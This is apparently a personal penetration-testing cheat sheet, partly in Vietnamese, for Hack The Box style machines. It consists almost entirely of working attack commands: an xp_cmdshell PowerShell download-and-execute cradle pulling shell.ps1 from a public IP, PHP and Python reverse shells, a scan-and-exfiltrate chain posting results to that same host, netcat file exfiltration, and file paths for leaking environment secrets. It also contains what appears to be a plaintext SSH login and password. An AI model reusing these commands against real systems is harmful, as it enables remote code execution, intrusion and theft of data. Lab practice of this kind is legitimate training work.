# PWNbox ssh
```
htb-ac-1444035@htb-pmuseptgcc.htb-cloud.com
y2BDp1p8

EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://95.111.254.81/shell.ps1'')"'

nmap -sVC --min-rate 1500 -p- -Pn 10.10.11.68
sudo nmap -sU --top-ports 100 -T4 -v <IP_Target>
```

# Setup Host

```
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```
# Recon 
### Quét thư mục và các file có đuôi php, bak, zip
```
gobuster dir -u http://[TARGET_IP] -w /usr/share/wordlists/dirb/common.txt -x php,bak,zip,txt -t 50
```
### Scan subdomain
```
curl -s https://api.github.com/repos/ropnop/impacket_static_binaries/releases/latest | grep "browser_download_url.*mssqlclient_linux_x86_64" | cut -d : -f 2,3 | tr -d \" | wget -qi - -O mssqlclient


wget https://github.com/shadow1ng/fscan/releases/download/1.8.2/fscan_amd64 -O fscan
cd /tmp; curl http://95.111.254.81/fscan -o fscan; chmod +x fscan; ./fscan -h 10.0.72.0/24 -o res.txt; curl --data-binary @res.txt http://95.111.254.81:8000/
gobuster vhost -u http://soulmate.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 50
```
# Tunnel

```
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```
# Reverse Shell
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/3333 0>&1'"); ?>
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("95.111.254.81",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
# Leak File từ Target

```
#target 
python3 -m http.server 8000 --bind 0.0.0.0

# local
wget http://TARGET:8000/filename -O filename
curl -O http://TARGET:8000/filename
```

```
nc 10.10.14.7 5555 < web_20250806_120723.zip.aes 
nc -lvnp 5555 > web_20250806_120723.zip.aes -> your machine
```

# Copy file Kali to Victim
`scp npbackup.conf marco@10.10.11.82:/tmp/npbackup.conf`


# Beautify CLi


```
script -qc /bin/bash /dev/null

python3 -c 'import pty,os; pty.spawn("/bin/bash")'
export TERM=xterm export SHELL=bash export HISTFILE=/dev/null
```

# RCE trick lỏd
```
/proc/self/cwd/package.json
/proc/self/cmdline
/proc/self/environ
```

### next .js old verison
```
/app/.env
/app/.next/server/pages/api/auth/[...nextauth].js
/app/.next/routes-manifest.json
```
# PE trick lỏd
```
sudo -l
find / -perm -u=s -type f 2>/dev/null
```
